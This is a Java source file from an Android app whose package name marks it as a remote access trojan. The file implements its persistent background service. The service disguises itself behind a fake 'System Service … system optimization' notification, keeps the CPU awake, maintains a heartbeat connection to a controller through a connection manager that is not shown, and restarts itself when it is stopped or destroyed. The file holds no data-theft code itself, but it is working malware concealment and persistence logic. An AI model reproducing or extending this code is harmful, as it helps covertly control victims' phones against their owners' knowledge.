package com.fly0rakoon.rat.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

import com.fly0rakoon.rat.MainActivity;
import com.fly0rakoon.rat.R;
import com.fly0rakoon.rat.utils.Constants;

public class ForegroundService extends Service {
    
    private static final String TAG = "ForegroundService";
    private static final String CHANNEL_ID = "fly0rakoon_channel";
    private static final int NOTIFICATION_ID = 1337;
    
    private ConnectionManager connectionManager;
    private PowerManager.WakeLock wakeLock;
    private Handler backgroundHandler;
    private HandlerThread handlerThread;
    private boolean isRunning = false;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service creating...");
        
        // Create a dedicated handler thread for background tasks
        handlerThread = new HandlerThread("ForegroundServiceThread");
        handlerThread.start();
        backgroundHandler = new Handler(handlerThread.getLooper());
        
        // Acquire wake lock to keep CPU running
        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "Fly0Rakoon::ForegroundServiceWakeLock"
        );
        wakeLock.acquire(10*60*1000L /*10 minutes*/);
        
        // Create notification channel for Android O+
        createNotificationChannel();
        
        // Start as foreground service
        startAsForeground();
        
        // Initialize connection manager
        connectionManager = new ConnectionManager(this);
        
        // Start connection in background
        backgroundHandler.post(() -> {
            connectionManager.start();
            isRunning = true;
        });
        
        // Schedule heartbeat to keep service alive
        scheduleHeartbeat();
    }
    
    private void startAsForeground() {
        // Create the notification
        Notification notification = createNotification();
        
        // Start foreground service
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIFICATION_ID, notification, 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        } else {
            startForeground(NOTIFICATION_ID, notification);
        }
    }
    
    private Notification createNotification() {
        // Intent to open MainActivity when notification is clicked
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 
            0, 
            notificationIntent,
            PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );
        
        // Build the notification
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("Maintaining system optimization...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setAutoCancel(false);
        
        // For older Android versions, add a large icon if available
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            builder.setLargeIcon(BitmapFactory.decodeResource(getResources(), 
                android.R.drawable.ic_dialog_info));
        }
        
        return builder.build();
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Fly0Rakoon Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("Background service channel");
            channel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }
    
    private void scheduleHeartbeat() {
        backgroundHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isRunning) {
                    // Send heartbeat to keep connection alive
                    if (connectionManager != null) {
                        connectionManager.sendHeartbeat();
                    }
                    
                    // Check if connection is still alive
                    if (connectionManager != null && !connectionManager.isConnected()) {
                        Log.d(TAG, "Connection lost, reconnecting...");
                        connectionManager.reconnect();
                    }
                    
                    // Schedule next heartbeat
                    backgroundHandler.postDelayed(this, Constants.HEARTBEAT_INTERVAL);
                }
            }
        }, Constants.HEARTBEAT_INTERVAL);
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service starting...");
        
        // If service is killed, restart it
        return START_STICKY;
    }
    
    @Override
    public void onDestroy() {
        Log.d(TAG, "Service destroying...");
        isRunning = false;
        
        // Stop connection manager
        if (connectionManager != null) {
            connectionManager.stop();
            connectionManager = null;
        }
        
        // Release wake lock
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        
        // Quit handler thread
        if (handlerThread != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                handlerThread.quitSafely();
            } else {
                handlerThread.quit();
            }
        }
        
        // Restart service if it was destroyed
        Intent restartIntent = new Intent(this, ForegroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restartIntent);
        } else {
            startService(restartIntent);
        }
        
        super.onDestroy();
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return new ForegroundBinder();
    }
    
    public class ForegroundBinder extends android.os.Binder {
        public ForegroundService getService() {
            return ForegroundService.this;
        }
    }
    
    // Method to check if service is running
    public boolean isRunning() {
        return isRunning;
    }
    
    // Method to get connection status
    public boolean isConnected() {
        return connectionManager != null && connectionManager.isConnected();
    }
    
    // Method to manually reconnect
    public void reconnect() {
        if (connectionManager != null) {
            backgroundHandler.post(() -> connectionManager.reconnect());
        }
    }
}